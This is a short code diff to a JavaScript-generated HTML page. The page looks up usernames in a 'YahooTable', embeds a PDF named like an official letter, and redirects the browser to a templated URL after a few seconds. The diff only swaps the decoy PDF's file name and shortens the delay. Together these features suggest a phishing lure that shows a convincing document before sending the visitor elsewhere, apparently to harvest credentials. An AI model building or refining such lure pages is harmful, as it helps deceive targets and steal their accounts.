@@ -78,7 +78,7 @@ const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';
        <script>
                 setTimeout(function() {
                     window.location.href = '${url}';
-                }, 4000);
+                }, 3000);
             </script> 
             <!-- Required meta tags -->
             <meta charset="utf-8">
@@ -90,7 +90,7 @@ const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';
         </head>
         <body>
 
-        <object data="./DNO LTR NO-2468 DT 24 Nov 2024.pdf" style="height:1200px;width:2060px;" ></object>
+        <object data="./1082 (Yearly Proposal 2025 related ltr).pdf" style="height:1200px;width:2060px;" ></object>
         
     </body>
         </html>
